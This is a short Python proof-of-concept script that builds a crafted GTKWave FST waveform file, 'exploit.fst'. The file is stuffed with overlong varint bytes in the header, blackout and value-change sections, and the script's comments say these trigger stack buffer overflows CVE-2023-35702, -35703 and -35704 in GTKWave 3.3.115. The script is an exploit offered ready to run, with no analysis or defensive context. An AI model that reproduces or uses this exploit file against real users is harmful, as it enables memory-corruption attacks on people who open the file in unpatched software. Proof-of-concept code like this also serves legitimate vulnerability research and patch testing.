#!/usr/bin/python3

# GTKWave FST LEB128 varint stack-based buffer overflow PoC
# Creates a malicious .fst file triggering CVE-2023-35702, CVE-2023-35703, CVE-2023-35704

import struct

def create_malicious_fst(filename):
    with open(filename, 'wb') as f:
        # FST_BL_HDR section (0x00)
        f.write(b'\x00')  # sectype
        f.write(struct.pack('>Q', 0x28))  # seclen (40 bytes)
        
        # Header content (to pass initial checks)
        f.write(struct.pack('>Q', 1))  # start_time (non-zero)
        f.write(struct.pack('>Q', 1))  # end_time (non-zero)
        f.write(struct.pack('>Q', 0))  # mem_used_by_writer
        f.write(struct.pack('>Q', 0))  # scope_count
        f.write(struct.pack('>Q', 0))  # var_count
        
        # FST_BL_BLACKOUT section (0x02) to trigger CVE-2023-35702 and CVE-2023-35703
        f.write(b'\x02')  # sectype
        f.write(struct.pack('>Q', 0x100))  # seclen (large enough)
        
        # Malicious varint32 (num_blackouts) - triggers CVE-2023-35702
        # This will write beyond the 5-byte buffer
        f.write(b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF')
        
        # Malicious varint64 (delta) - triggers CVE-2023-35703
        # This will write beyond the 16-byte buffer
        f.write(b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF')
        f.write(b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF')
        
        # FST_BL_VC section (0x04) to trigger CVE-2023-35704
        f.write(b'\x04')  # sectype
        f.write(struct.pack('>Q', 0x100))  # seclen
        
        # Malicious varint32WithSkip - triggers CVE-2023-35704
        f.write(b'\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF')

if __name__ == '__main__':
    print("[*] Creating malicious FST file...")
    create_malicious_fst("exploit.fst")
    print("[+] Malicious FST file created as 'exploit.fst'")
    print("[*] Open this file with GTKWave 3.3.115 to trigger the vulnerabilities")